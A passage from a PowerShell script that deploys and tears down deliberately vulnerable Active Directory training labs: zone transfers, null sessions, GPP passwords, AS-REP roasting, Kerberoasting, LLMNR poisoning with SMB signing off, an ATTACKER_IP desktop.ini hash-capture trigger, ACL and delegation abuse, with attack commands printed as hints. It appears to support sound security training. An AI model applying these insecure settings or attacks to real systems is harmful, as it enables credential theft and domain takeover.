    Set-ADUser -Identity "helpdesk01" -Replace @{adminCount=0} -ErrorAction SilentlyContinue
    Set-ADAccountControl -Identity "jdoe_legacy" -DoesNotRequirePreAuth $false -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_legacy" -Clear description -ErrorAction SilentlyContinue
    Remove-ActiveLab "E5-PowerView-Targets"
    Write-Status "Lab E5 cleaned." OK
}

# E6  -  DNS Zone Transfer
function Deploy-Lab-E6 {
    Write-Status "Enabling DNS zone transfers (any server)..." WORK
    $zone = $Global:ADPConfig.Domain
    Set-DnsServerPrimaryZone -Name $zone -SecureSecondaries "TransferAnyServer" -Notify "NotifyServers" -ErrorAction SilentlyContinue
    dnscmd /zoneresetsecondaries $zone /nonsecure /notifylist | Out-Null
    Add-ActiveLab "E6-DNS-ZoneTransfer"
    Write-Status "Lab E6 deployed. Zone '$zone' allows transfers from any host." OK
}

function Teardown-Lab-E6 {
    $zone = $Global:ADPConfig.Domain
    Set-DnsServerPrimaryZone -Name $zone -SecureSecondaries "TransferToSecureServers" -ErrorAction SilentlyContinue
    Remove-ActiveLab "E6-DNS-ZoneTransfer"
    Write-Status "Lab E6 cleaned." OK
}

# E7  -  RPC Enumeration
function Deploy-Lab-E7 {
    Write-Status "Enabling RPC null session enumeration..." WORK
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous" -Value 0 -ErrorAction SilentlyContinue
    # Allow anonymous SID/Name translation
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "TurnOffAnonymousBlock" -Value 1 -ErrorAction SilentlyContinue
    Add-ActiveLab "E7-RPC-Enum"
    Write-Status "Lab E7 deployed. RPC null sessions permitted (rpcclient -U '' -N)." OK
}

function Teardown-Lab-E7 {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous" -Value 1 -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "TurnOffAnonymousBlock" -ErrorAction SilentlyContinue
    Remove-ActiveLab "E7-RPC-Enum"
    Write-Status "Lab E7 cleaned." OK
}

# E8  -  GPO / GPP Password Enumeration
function Deploy-Lab-E8 {
    Write-Status "Planting GPP password entry in SYSVOL..." WORK
    $domain  = $Global:ADPConfig.Domain
    $sysvolPath = "C:\Windows\SYSVOL\sysvol\$domain\Policies"
    $gppGuid = "{ADP00001-0000-0000-0000-000000000001}"
    $gppPath = "$sysvolPath\$gppGuid\Machine\Preferences\Groups"
    New-Item -ItemType Directory -Force -Path $gppPath | Out-Null
    # GPP cpassword  -  AES-256-CBC with the published MS14-025 key, zero IV
    # Decrypt with: gpp-decrypt [cpassword]  or  Get-GPPPassword (PowerSploit)
    # ConvertTo-GPPCPassword computes this correctly at runtime so the value is always right.
    $encPwd = ConvertTo-GPPCPassword "password123"
    $xmlContent = @"
<?xml version="1.0" encoding="UTF-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators" image="2" changed="2024-01-15 10:00:00" uid="{ADP00002-0000-0000-0000-000000000002}">
    <Properties action="U" newName="" description="Local admin" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators">
      <Members>
        <Member name="corp\svc_backup" action="ADD" sid="" />
      </Members>
    </Properties>
  </Group>
</Groups>
"@
    $xmlContent | Set-Content "$gppPath\Groups.xml" -Encoding UTF8
    # Also write a cpassword-bearing XML
    $cpwdXml = @"
<?xml version="1.0" encoding="UTF-8"?>
<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}">
  <NTService clsid="{AB6D4B8D-B965-4328-B33D-F40FBE4A9B4E}" name="BackupSvc" image="0" changed="2024-01-15 10:00:00" uid="{ADP00003-0000-0000-0000-000000000003}" userContext="1" removePolicy="0">
    <Properties startupType="AUTOMATIC" serviceName="BackupSvc" serviceAction="START" timeout="30" accountName=".\svc_backup" cpassword="$encPwd" />
  </NTService>
</NTServices>
"@
    $svcPath = "$sysvolPath\$gppGuid\Machine\Preferences\Services"
    New-Item -ItemType Directory -Force -Path $svcPath | Out-Null
    $cpwdXml | Set-Content "$svcPath\Services.xml" -Encoding UTF8
    Add-ActiveLab "E8-GPP-Password"
    Write-Status "Lab E8 deployed. GPP cpassword planted at: $sysvolPath\$gppGuid" OK
    Write-Status "Decrypt with: gpp-decrypt [cpassword] or Get-GPPPassword (PowerSploit)" INFO
}

function Teardown-Lab-E8 {
    $domain  = $Global:ADPConfig.Domain
    $gppPath = "C:\Windows\SYSVOL\sysvol\$domain\Policies\{ADP00001-0000-0000-0000-000000000001}"
    Remove-Item -Recurse -Force $gppPath -ErrorAction SilentlyContinue
    Remove-ActiveLab "E8-GPP-Password"
    Write-Status "Lab E8 cleaned." OK
}

# E9  -  User Enumeration (Kerbrute / OSINT targets)
function Deploy-Lab-E9 {
    Write-Status "Creating user enumeration targets (AS-REP candidates, valid user list)..." WORK
    $users = @("jsmith","mjohnson","rwilliams","lbrown","djones")
    $dn    = Get-DomainDN
    foreach ($u in $users) {
        New-ADUser -Name $u -SamAccountName $u -UserPrincipalName "$u@$($Global:ADPConfig.Domain)" `
            -Path "OU=Employees,$dn" `
            -AccountPassword (ConvertTo-SecureString $Global:ADPConfig.BasePwd -AsPlainText -Force) `
            -Enabled $true -PasswordNeverExpires $true -ErrorAction SilentlyContinue
    }
    # Make 2 of them AS-REP roastable
    Set-ADAccountControl -Identity "jsmith"   -DoesNotRequirePreAuth $true -ErrorAction SilentlyContinue
    Set-ADAccountControl -Identity "mjohnson" -DoesNotRequirePreAuth $true -ErrorAction SilentlyContinue

    # --- Simulated OSINT artifact ---
    # In real engagements students find usernames via LinkedIn, email format guessing,
    # or exposed internal shares. We simulate this by planting a "staff directory"
    # on an anonymously readable share - students must enumerate the network to find it.
    $sharePath = "C:\ADPLab_Staff"
    New-Item -ItemType Directory -Force -Path $sharePath | Out-Null

    # Pull all current AD users and write them in common username formats
    $allUsers = Get-ADUser -Filter * -Properties GivenName,Surname,Department | Where-Object { $_.GivenName -and $_.Surname }
    $samList     = @()
    $emailList   = @()
    $displayList = @()
    foreach ($u in $allUsers) {
        $sam = $u.SamAccountName
        $fn  = $u.GivenName.ToLower()
        $ln  = $u.Surname.ToLower()
        $samList     += $sam
        $samList     += "$($fn.Substring(0,1))$ln"   # flast format (common naming convention)
        $samList     += "$fn.$ln"                     # first.last format
        $emailList   += "$sam@$($Global:ADPConfig.Domain)"
        $displayList += "$($u.GivenName) $($u.Surname) - $($u.Department)"
    }
    $samList = $samList | Sort-Object -Unique
    # users.txt  - samAccountName list (kerbrute / spray format)
    $samList     | Sort-Object -Unique | Set-Content "$sharePath\users.txt"         -Encoding UTF8
    # emails.txt - UPN list
    $emailList   | Sort-Object -Unique | Set-Content "$sharePath\emails.txt"        -Encoding UTF8
    # staff_directory.txt - human-readable, like a scraped internal page
    @"
===================================================
  $($Global:ADPConfig.Domain.ToUpper()) - Staff Directory
  (exported from HR portal  -  INTERNAL USE ONLY)
===================================================
"@ | Set-Content "$sharePath\staff_directory.txt" -Encoding UTF8
    $displayList | Sort-Object | Add-Content "$sharePath\staff_directory.txt"

    # ── Expose files via IIS with directory browsing enabled ─────────────────
    # Simulates a Domain Controller running IIS with an internal staff portal
    # misconfigured to allow anonymous directory listing - a realistic and common
    # pentest finding. Students enumerate with nmap, then browse/download via curl.

    # Install the three IIS role services needed for anonymous static-file + dir-listing.
    # Web-Static-Content lets IIS serve .txt files.
    # Web-Dir-Browsing   is the feature that enables directory listings;
    #                    web.config alone cannot turn it on if the feature is absent.
    $features = @("Web-Server","Web-Static-Content","Web-Dir-Browsing")
    $missing  = $features | Where-Object { -not (Get-WindowsFeature -Name $_ -EA SilentlyContinue).Installed }
    if ($missing) {
        Write-Status "Installing IIS features ($($missing -join ', ')) - first time, ~60 s..." WORK
        Install-WindowsFeature -Name $missing -IncludeManagementTools | Out-Null
    }

    # Copy lab files into /staff/ under the default IIS site root
    $wwwStaff = "C:\inetpub\wwwroot\staff"
    New-Item -ItemType Directory -Force -Path $wwwStaff | Out-Null
    Copy-Item "$sharePath\*" $wwwStaff -Force -ErrorAction SilentlyContinue

    # Enable directory browsing at the IIS server level (WebAdministration module)
    # This is required in addition to web.config when the feature was just installed.
    Import-Module WebAdministration -ErrorAction SilentlyContinue
    if (Get-Module WebAdministration -ErrorAction SilentlyContinue) {
        Set-WebConfigurationProperty -Filter '/system.webServer/directoryBrowse' `
            -Name 'enabled' -Value $true -PSPath 'IIS:\' -ErrorAction SilentlyContinue
    }

    # web.config in /staff/: enable dir browsing, disable default document
    @"
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <directoryBrowse enabled="true" />
    <defaultDocument enabled="false" />
  </system.webServer>
</configuration>
"@ | Set-Content "$wwwStaff\web.config" -Encoding UTF8

    # index.html fallback - renders as a believable internal HR portal so the lab
    # works even if a GPO or higher-level web.config overrides directory browsing.
    $domainLabel = $Global:ADPConfig.Domain.ToUpper()
    @"
<!DOCTYPE html>
<html><head><title>$domainLabel - Staff Portal</title></head>
<body style="font-family:Arial,sans-serif;padding:30px;background:#f0f0f0">
<h2>$domainLabel Internal Staff Portal</h2>
<p style="color:darkred"><strong>INTERNAL USE ONLY -- Authorised Personnel Only</strong></p>
<p>HR directory exports, updated weekly. Contact IT-Helpdesk for access issues.</p>
<ul>
  <li><a href="users.txt">users.txt</a> -- Active staff usernames</li>
  <li><a href="emails.txt">emails.txt</a> -- Staff email addresses</li>
  <li><a href="staff_directory.txt">staff_directory.txt</a> -- Full staff directory</li>
</ul>
</body></html>
"@ | Set-Content "$wwwStaff\index.html" -Encoding UTF8

    # Restart IIS so all config changes (feature install, web.config) take effect
    Start-Service W3SVC -ErrorAction SilentlyContinue
    & "$env:SystemRoot\System32\inetsrv\iisreset.exe" /restart /noforce 2>&1 | Out-Null
    Start-Sleep -Seconds 3

    # Firewall: allow inbound port 80 on ALL profiles (Domain/Private/Public)
    # so Tailscale / host-only / bridged VM networks all work
    netsh advfirewall firewall delete rule name="ADPLab-E9-IIS" | Out-Null
    netsh advfirewall firewall add rule name="ADPLab-E9-IIS" `
        dir=in action=allow protocol=TCP localport=80 profile=any | Out-Null

    # Liveness check: verify port 80 is listening
    $up = $false
    for ($t = 0; $t -lt 10; $t++) {
        Start-Sleep -Milliseconds 500
        if (Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue) {
            $up = $true; break
        }
    }
    if (-not $up) {
        Write-Status "IIS is not listening on port 80. Check IIS installation." FAIL
        Write-Status "Run: Install-WindowsFeature Web-Server,Web-Static-Content,Web-Dir-Browsing" INFO
        return
    }

    # Local HTTP round-trip check - confirms IIS actually serves the file
    try {
        $r = Invoke-WebRequest -Uri "http://localhost/staff/users.txt" -UseBasicParsing -TimeoutSec 5 -EA Stop
        Write-Status "IIS local self-check: HTTP $($r.StatusCode) - users.txt served OK." OK
    } catch {
        Write-Status "IIS local check failed: $_ - try Teardown + re-deploy." WARN
    }

    Add-ActiveLab "E9-User-Enum"
    Write-Status "Lab E9 deployed. 5 users added; jsmith + mjohnson have pre-auth disabled." OK
    Write-Status "IIS staff portal : http://$($env:COMPUTERNAME)/staff/" OK
    Write-Status "Grab user list   : curl http://[DC_IP]/staff/users.txt -o users.txt" INFO
    Write-Status "Then AS-REP      : GetNPUsers.py [domain]/ -dc-ip [DC_IP] -no-pass -usersfile users.txt -format hashcat" INFO
}

function Teardown-Lab-E9 {
    $users = @("jsmith","mjohnson","rwilliams","lbrown","djones")
    foreach ($u in $users) {
        Remove-ADUser -Identity $u -Confirm:$false -ErrorAction SilentlyContinue
    }

    # Remove the IIS /staff/ directory and staging folder.
    # Do NOT stop IIS or uninstall Web-Server - it may have been pre-existing.
    Remove-Item -Recurse -Force "C:\inetpub\wwwroot\staff" -ErrorAction SilentlyContinue
    Remove-Item -Recurse -Force "C:\ADPLab_Staff"           -ErrorAction SilentlyContinue

    # Remove the firewall rule added during deploy
    netsh advfirewall firewall delete rule name="ADPLab-E9-IIS" | Out-Null

    Remove-ActiveLab "E9-User-Enum"
    Write-Status "Lab E9 cleaned. IIS /staff directory removed (IIS itself left intact)." OK
}

# E10  -  Trust Enumeration
function Deploy-Lab-E10 {
    Write-Status "Configuring trust enumeration artefacts..." WORK
    # Create a dummy trust object to enumerate (one-way external trust simulation)
    # Real cross-forest trust requires second DC; we simulate the enumerable attributes
    $dn = Get-DomainDN
    $trustObj = @{
        Name              = "extcorp.local"
        TrustDirection    = "Outbound"
        TrustType         = "External"
        TrustAttributes   = 0
    }
    # Set SID History on a user to simulate trust abuse surface
    # Note: requires domain functional level manipulation in real env; we mark it for enumeration
    Set-ADUser -Identity "jdoe_legacy" -Replace @{description="SIDHistory abuse candidate - external trust"} -ErrorAction SilentlyContinue
    Add-ActiveLab "E10-Trust-Enum"
    Write-Status "Lab E10 deployed." OK
    Write-Status "Enumerate with: Get-ADTrust -Filter * | PowerView Get-DomainTrust" INFO
}

function Teardown-Lab-E10 {
    Set-ADUser -Identity "jdoe_legacy" -Clear description -ErrorAction SilentlyContinue
    Remove-ActiveLab "E10-Trust-Enum"
    Write-Status "Lab E10 cleaned." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  ══════════════════  CREDENTIAL ATTACK LABS  ═════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

# C1  -  AS-REP Roasting
function Deploy-Lab-C1 {
    Write-Status "Enabling AS-REP Roasting targets..." WORK
    $targets = @("jdoe_legacy","svc_legacy","analyst01")
    foreach ($t in $targets) {
        Set-ADAccountControl -Identity $t -DoesNotRequirePreAuth $true -ErrorAction SilentlyContinue
    }
    Add-ActiveLab "C1-ASREP-Roasting"
    Write-Status "Lab C1 deployed. AS-REP targets: $($targets -join ', ')" OK
    Write-Status "Attack: GetNPUsers.py [domain]/ -usersfile users.txt -format hashcat" INFO
}

function Teardown-Lab-C1 {
    $targets = @("jdoe_legacy","svc_legacy","analyst01")
    foreach ($t in $targets) {
        Set-ADAccountControl -Identity $t -DoesNotRequirePreAuth $false -ErrorAction SilentlyContinue
    }
    Remove-ActiveLab "C1-ASREP-Roasting"
    Write-Status "Lab C1 cleaned." OK
}

# C2  -  Kerberoasting
function Deploy-Lab-C2 {
    Write-Status "Setting up Kerberoasting targets (SPNs on weak-password accounts)..." WORK
    Set-ADUser -Identity "svc_sql"    -ServicePrincipalNames @{Add="MSSQLSvc/sql01:1433"} -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_web"    -ServicePrincipalNames @{Add="HTTP/web01"} -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_backup" -ServicePrincipalNames @{Add="HOST/backup01"} -ErrorAction SilentlyContinue
    # Passwords already set during baseline to rockyou.txt entries (dragon / sunshine)
    # No reset needed  -  intentionally left as-is for cracking practice
    Add-ActiveLab "C2-Kerberoasting"
    Write-Status "Lab C2 deployed. Kerberoastable: svc_sql, svc_web, svc_backup" OK
    Write-Status "Attack: GetUserSPNs.py [domain]/[user]:[pwd] -request" INFO
}

function Teardown-Lab-C2 {
    # Remove the SPNs that Deploy-Lab-C2 added (not the baseline ones set during population)
    Set-ADUser -Identity "svc_sql"    -ServicePrincipalNames @{Remove="MSSQLSvc/sql01:1433"} -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_web"    -ServicePrincipalNames @{Remove="HTTP/web01"}           -ErrorAction SilentlyContinue
    # svc_backup: HOST/backup01 is also from baseline - leave it; the lab adds no new unique SPN for it
    Remove-ActiveLab "C2-Kerberoasting"
    Write-Status "Lab C2 cleaned. Lab-added SPNs removed; baseline SPNs preserved." OK
}

# C3  -  Password Spraying
function Deploy-Lab-C3 {
    Write-Status "Setting up password spray targets (weak common passwords)..." WORK
    # Passwords already set at baseline  -  all confirmed in rockyou.txt
    # jdoe_legacy → Welcome1  |  svc_legacy → abc123  |  helpdesk01 → Password1
    # Ensure fine-grained password policy doesn't lockout too fast
    Add-ActiveLab "C3-Password-Spray"
    Write-Status "Lab C3 deployed. Spray targets with rockyou.txt passwords: Welcome1, abc123, Password1" OK
    Write-Status "Attack: kerbrute passwordspray --dc [IP] --domain [DOMAIN] users.txt [password]" INFO
}

function Teardown-Lab-C3 {
    Remove-ActiveLab "C3-Password-Spray"
    Write-Status "Lab C3 cleaned." OK
}

# C4  -  LLMNR / NBT-NS Poisoning
function Deploy-Lab-C4 {
    Write-Status "Enabling LLMNR and NBT-NS (disabled by default on 2019/2022)..." WORK
    # Enable LLMNR via registry
    $llmnrPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
    if (-not (Test-Path $llmnrPath)) { New-Item -Path $llmnrPath -Force | Out-Null }
    Set-ItemProperty -Path $llmnrPath -Name "EnableMulticast" -Value 1 -ErrorAction SilentlyContinue
    # Enable NetBIOS over TCP/IP (per adapter)
    Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | ForEach-Object {
        $_.SetTcpipNetbios(1) | Out-Null
    }
    # Ensure SMB signing not enforced (for relay)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0 -ErrorAction SilentlyContinue
    Add-ActiveLab "C4-LLMNR-Poisoning"
    Write-Status "Lab C4 deployed. LLMNR + NBT-NS enabled, SMB signing not required." OK
    Write-Status "Attack: responder -I [iface] -wdF  then ntlmrelayx.py" INFO
}

function Teardown-Lab-C4 {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0 -ErrorAction SilentlyContinue
    Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | ForEach-Object {
        $_.SetTcpipNetbios(2) | Out-Null
    }
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1 -ErrorAction SilentlyContinue
    Remove-ActiveLab "C4-LLMNR-Poisoning"
    Write-Status "Lab C4 cleaned." OK
}

# C5  -  Credentials in AD Attributes
function Deploy-Lab-C5 {
    Write-Status "Planting credentials in AD user attributes..." WORK
    Set-ADUser -Identity "svc_backup"  -Description "Pwd: Monkey1 | Backup system account" -ErrorAction SilentlyContinue
    Set-ADUser -Identity "helpdesk01"  -Replace @{info="Temporary password set: Password1 - user to change on next login"} -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_legacy"  -Description "Legacy service account pwd=abc123 do not change" -ErrorAction SilentlyContinue
    Add-ActiveLab "C5-Creds-In-Attrs"
    Write-Status "Lab C5 deployed. Passwords visible in Description/Info on: svc_backup, helpdesk01, svc_legacy" OK
    Write-Status "Enumerate: Get-ADUser -Filter * -Properties Description | Where Description -like '*pwd*'" INFO
}

function Teardown-Lab-C5 {
    Set-ADUser -Identity "svc_backup"  -Clear description -ErrorAction SilentlyContinue
    Set-ADUser -Identity "helpdesk01"  -Clear info        -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_legacy"  -Clear description -ErrorAction SilentlyContinue
    Remove-ActiveLab "C5-Creds-In-Attrs"
    Write-Status "Lab C5 cleaned." OK
}

# C6  -  NTLMv2 Hash Capture (UNC trigger)
function Deploy-Lab-C6 {
    Write-Status "Placing UNC path trigger for NTLMv2 hash capture..." WORK
    $trigger = "C:\ADPLab_NTLMTrigger"
    New-Item -ItemType Directory -Force $trigger | Out-Null
    # desktop.ini trick  -  opens a UNC path when folder is browsed
    $ini = @"
[.ShellClassInfo]
IconResource=\\ATTACKER_IP\share\icon.ico
"@
    $ini | Set-Content "$trigger\desktop.ini" -Encoding Unicode
    # attrib +s +h on desktop.ini
    attrib +s +h "$trigger\desktop.ini"
    New-SmbShare -Name "LabTrigger" -Path $trigger -FullAccess "Everyone" -ErrorAction SilentlyContinue
    Add-ActiveLab "C6-NTLMv2-Capture"
    Write-Status "Lab C6 deployed. Share \\localhost\LabTrigger has UNC trigger in desktop.ini." OK
    Write-Status "Replace ATTACKER_IP in desktop.ini, then run Responder on attacker machine." INFO
}

function Teardown-Lab-C6 {
    Remove-SmbShare -Name "LabTrigger" -Force -ErrorAction SilentlyContinue
    Remove-Item -Recurse -Force "C:\ADPLab_NTLMTrigger" -ErrorAction SilentlyContinue
    Remove-ActiveLab "C6-NTLMv2-Capture"
    Write-Status "Lab C6 cleaned." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  ══════════════════════  ACL ABUSE LABS  ═════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

function Set-ADLabACE {
    param([string]$TargetDN, [System.Security.Principal.SecurityIdentifier]$PrincipalSID,
          [System.DirectoryServices.ActiveDirectoryRights]$Rights, [switch]$Remove)
    $acl  = Get-Acl "AD:\$TargetDN"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $PrincipalSID, $Rights,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    if ($Remove) { $acl.RemoveAccessRule($rule) | Out-Null }
    else          { $acl.AddAccessRule($rule) }
    Set-Acl "AD:\$TargetDN" $acl -ErrorAction SilentlyContinue
}

# A1  -  WriteDACL on Domain Object
function Deploy-Lab-A1 {
    Write-Status "Granting helpdesk01 WriteDACL on the domain object..." WORK
    $sid = (Get-ADUser "helpdesk01").SID
    $dn  = Get-DomainDN
    Set-ADLabACE -TargetDN $dn -PrincipalSID $sid -Rights WriteDacl
    Add-ActiveLab "A1-WriteDACL"
    Write-Status "Lab A1 deployed. helpdesk01 has WriteDACL on $dn" OK
    Write-Status "Escalate: Add DCSync rights via PowerView Add-ObjectACL" INFO
}

function Teardown-Lab-A1 {
    $sid = (Get-ADUser "helpdesk01").SID
    $dn  = Get-DomainDN
    Set-ADLabACE -TargetDN $dn -PrincipalSID $sid -Rights WriteDacl -Remove
    Remove-ActiveLab "A1-WriteDACL"
    Write-Status "Lab A1 cleaned." OK
}

# A2  -  GenericAll on User
function Deploy-Lab-A2 {
    Write-Status "Granting helpdesk01 GenericAll over dbadmin..." WORK
    $sid    = (Get-ADUser "helpdesk01").SID
    $target = (Get-ADUser "dbadmin").DistinguishedName
    Set-ADLabACE -TargetDN $target -PrincipalSID $sid -Rights GenericAll
    Add-ActiveLab "A2-GenericAll"
    Write-Status "Lab A2 deployed. helpdesk01 has GenericAll on dbadmin." OK
    Write-Status "Exploit: Reset dbadmin password, add to Domain Admins, set SPN for Kerberoast." INFO
}

function Teardown-Lab-A2 {
    $sid    = (Get-ADUser "helpdesk01").SID
    $target = (Get-ADUser "dbadmin").DistinguishedName
    Set-ADLabACE -TargetDN $target -PrincipalSID $sid -Rights GenericAll -Remove
    Remove-ActiveLab "A2-GenericAll"
    Write-Status "Lab A2 cleaned." OK
}

# A3  -  GenericWrite on User
function Deploy-Lab-A3 {
    Write-Status "Granting analyst01 GenericWrite over svc_sql..." WORK
    $sid    = (Get-ADUser "analyst01").SID
    $target = (Get-ADUser "svc_sql").DistinguishedName
    Set-ADLabACE -TargetDN $target -PrincipalSID $sid -Rights GenericWrite
    Add-ActiveLab "A3-GenericWrite"
    Write-Status "Lab A3 deployed. analyst01 has GenericWrite on svc_sql." OK
    Write-Status "Exploit: Set SPN on svc_sql then Kerberoast it, or set logon script." INFO
}

function Teardown-Lab-A3 {
    $sid    = (Get-ADUser "analyst01").SID
    $target = (Get-ADUser "svc_sql").DistinguishedName
    Set-ADLabACE -TargetDN $target -PrincipalSID $sid -Rights GenericWrite -Remove
    Remove-ActiveLab "A3-GenericWrite"
    Write-Status "Lab A3 cleaned." OK
}

# A4  -  ForceChangePassword
function Deploy-Lab-A4 {
    Write-Status "Granting helpdesk01 ForceChangePassword over multiple users..." WORK
    $sid     = (Get-ADUser "helpdesk01").SID
    $targets = @("analyst01","svc_scan","jdoe_legacy")
    $extRight = [System.Guid]"00299570-246d-11d0-a768-00aa006e0529"
    foreach ($t in $targets) {
        $dn  = (Get-ADUser $t).DistinguishedName
        $acl = Get-Acl "AD:\$dn"
        $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $extRight,
            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        $acl.AddAccessRule($rule)
        Set-Acl "AD:\$dn" $acl -ErrorAction SilentlyContinue
    }
    Add-ActiveLab "A4-ForceChangePassword"
    Write-Status "Lab A4 deployed. helpdesk01 can force password reset on: $($targets -join ', ')" OK
}

function Teardown-Lab-A4 {
    $sid     = (Get-ADUser "helpdesk01").SID
    $targets = @("analyst01","svc_scan","jdoe_legacy")
    $extRight = [System.Guid]"00299570-246d-11d0-a768-00aa006e0529"
    foreach ($t in $targets) {
        $dn  = (Get-ADUser $t).DistinguishedName
        $acl = Get-Acl "AD:\$dn"
        $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $extRight,
            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        $acl.RemoveAccessRule($rule) | Out-Null
        Set-Acl "AD:\$dn" $acl -ErrorAction SilentlyContinue
    }
    Remove-ActiveLab "A4-ForceChangePassword"
    Write-Status "Lab A4 cleaned." OK
}

# A5  -  AddMember (Self) to Privileged Group
function Deploy-Lab-A5 {
    Write-Status "Granting analyst01 ability to add members to IT-Admins group..." WORK
    $sid    = (Get-ADUser "analyst01").SID
    $target = (Get-ADGroup "IT-Admins").DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    # WriteProperty on member attribute
    $memberGuid = [System.Guid]"bf9679c0-0de6-11d0-a285-00aa003049e2"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
        [System.Security.AccessControl.AccessControlType]::Allow,
        $memberGuid,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
    )
    $acl.AddAccessRule($rule)
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    Add-ActiveLab "A5-AddMember"
    Write-Status "Lab A5 deployed. analyst01 can add members to IT-Admins." OK
    Write-Status "Exploit: Add-ADGroupMember -Identity IT-Admins -Members analyst01 (as analyst01)" INFO
}

function Teardown-Lab-A5 {
    $sid    = (Get-ADUser "analyst01").SID
    $target = (Get-ADGroup "IT-Admins").DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    Remove-ActiveLab "A5-AddMember"
    Write-Status "Lab A5 cleaned." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  ════════════════════  DELEGATION LABS  ══════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

# D1  -  Unconstrained Delegation
function Deploy-Lab-D1 {
    Write-Status "Enabling Unconstrained Delegation on a computer account..." WORK
    $compName = $env:COMPUTERNAME
    Set-ADComputer -Identity $compName -TrustedForDelegation $true -ErrorAction SilentlyContinue
    # Also on a service account
    Set-ADAccountControl -Identity "svc_web" -TrustedForDelegation $true -ErrorAction SilentlyContinue
    Add-ActiveLab "D1-Unconstrained-Delegation"
    Write-Status "Lab D1 deployed. Unconstrained delegation: $compName, svc_web" OK
    Write-Status "Exploit: Monitor with Rubeus monitor /interval:5 then trigger printer bug (SpoolSample)" INFO
}

function Teardown-Lab-D1 {
    $compName = $env:COMPUTERNAME
    Set-ADComputer -Identity $compName -TrustedForDelegation $false -ErrorAction SilentlyContinue
    Set-ADAccountControl -Identity "svc_web" -TrustedForDelegation $false -ErrorAction SilentlyContinue
    Remove-ActiveLab "D1-Unconstrained-Delegation"
    Write-Status "Lab D1 cleaned." OK
}

# D2  -  Constrained Delegation
function Deploy-Lab-D2 {
    Write-Status "Configuring Constrained Delegation on svc_sql..." WORK
    $dc = (Get-ADDomainController).Name
    Set-ADUser -Identity "svc_sql" -Add @{"msDS-AllowedToDelegateTo"=@("cifs/$dc","cifs/$dc.$($Global:ADPConfig.Domain)")} -ErrorAction SilentlyContinue
    Set-ADAccountControl -Identity "svc_sql" -TrustedToAuthForDelegation $true -ErrorAction SilentlyContinue
    Add-ActiveLab "D2-Constrained-Delegation"
    Write-Status "Lab D2 deployed. svc_sql trusted to delegate to CIFS on $dc (Protocol Transition enabled)." OK
    Write-Status "Exploit: getST.py -spn cifs/$dc -impersonate Administrator -dc-ip [DC] [domain]/svc_sql:[pwd]" INFO
}

function Teardown-Lab-D2 {
    Set-ADUser -Identity "svc_sql" -Clear "msDS-AllowedToDelegateTo" -ErrorAction SilentlyContinue
    Set-ADAccountControl -Identity "svc_sql" -TrustedToAuthForDelegation $false -ErrorAction SilentlyContinue
    Remove-ActiveLab "D2-Constrained-Delegation"
    Write-Status "Lab D2 cleaned." OK
}

# D3  -  Resource-Based Constrained Delegation (RBCD)
function Deploy-Lab-D3 {
